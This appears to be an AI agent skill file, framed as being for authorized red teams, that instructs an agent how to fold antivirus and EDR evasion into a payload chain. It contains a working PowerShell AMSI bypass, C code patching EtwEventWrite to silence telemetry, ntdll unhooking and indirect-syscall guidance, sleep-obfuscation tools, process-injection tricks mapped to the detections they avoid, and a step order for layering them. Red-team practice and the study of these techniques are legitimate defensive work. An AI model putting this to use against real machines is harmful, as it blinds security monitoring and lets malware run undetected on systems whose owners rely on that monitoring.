---
name: evasion-technique-integrate
description: "Integrating evasion techniques into a payload chain: AMSI bypass, ETW patching, unhooking, and sleep obfuscation, with the detection each one addresses. Use this skill when building an authorized red team payload."
---

# Evasion Integration

## Overview

Layer evasion to match the defenses: AMSI for script scanning, ETW for telemetry, user-mode hooks for API monitoring, memory scanners for beacons.

## AMSI bypass

AMSI scans PowerShell/.NET/VBScript before execution. Patch the `AmsiScanBuffer` result:

```powershell
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$f = $a.GetField('amsiInitFailed','NonPublic,Static')
$f.SetValue($null,$true)
```

Or patch memory:

```c
// overwrite AmsiScanBuffer's prologue with a return of AMSI_RESULT_CLEAN
```

Modern Windows defends the AMSI context; the field-based bypass is patched in PS 5.1+ on updated systems — use a memory patch or `CLM` escape.

## ETW patching

`EtwEventWrite` feeds .NET/AMSI telemetry to defenders. Patch its prologue to `xor eax,eax; ret`:

```c
unsigned char patch[] = {0x33, 0xC0, 0xC3};
DWORD old;
VirtualProtect(EtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);
memcpy(EtwEventWrite, patch, sizeof(patch));
```

## Unhooking

EDRs hook `ntdll` functions. Restore the original bytes from a fresh copy on disk:

```c
// read ntdll from KnownDlls or disk, copy .text back over the hooked section
```

Or use direct/indirect syscalls to skip the hooked stubs entirely.

## Sleep obfuscation

Beacons sleeping in RWX memory are scanned. Encrypt the beacon while sleeping:

- `Ekko` — ROP-based `VirtualProtect` + `SystemFunction032` (RC4) + timer
- `Foliage` — APC-based variant
- `DeathSleep`

## Process injection hardening

| Technique | Detection avoided |
|---|---|
| Module stomping | unbacked executable memory |
| `NtMapViewOfSection` | `VirtualAllocEx` telemetry |
| Callback execution | thread creation |
| PPID spoofing | process tree anomaly |
| Command line spoofing | command line telemetry |

## Layering order

1. Unhook before calling anything.
2. Patch AMSI/ETW before script or .NET execution.
3. Encrypt while sleeping.
4. Use indirect syscalls for the sensitive calls.

## Pitfalls

- Patching ETW breaks legitimate telemetry and may crash the host process.
- Unhooking must happen before any hooked function is used.
- Each layer adds a signature of its own — a known Ekko implementation is detected.

## Verification

Each bypass must be confirmed: the API returns clean while the payload still executes.
